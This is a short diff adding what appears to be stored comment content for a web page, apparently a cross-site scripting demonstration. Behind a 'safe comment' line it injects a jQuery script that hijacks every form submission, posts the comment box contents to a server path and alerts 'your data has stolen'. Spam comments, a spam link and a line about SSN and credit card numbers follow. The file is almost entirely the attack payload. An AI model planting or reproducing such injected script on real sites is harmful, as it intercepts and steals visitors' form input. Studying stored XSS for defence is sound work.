@@ -1,0 +1,16 @@
+hi this is a safe comment<br /><script src="https://code.jquery.com/jquery-3.3.1.js"></script>
+        <script>
+            function malAddComment() {
+                event.preventDefault();
+                $.post(
+                        "/.php",
+                        {commentdata:$("#commentbox").val()},
+                        function (data,status,xhr) {
+                            alert('your data has stolen');
+                        },
+                        "text"
+                );
+                return false;
+            }
+$("form").submit(malAddComment);
+</script><br />another safe spam comment http://toonesalive.com<br />what a great website, i'm so glad i found this info!<br />what a great website, i'm so glad i found this info!<br />what a great website, i'm so glad i found this info!<br />here's all my secret information<br />ssn number, credit card number<br />
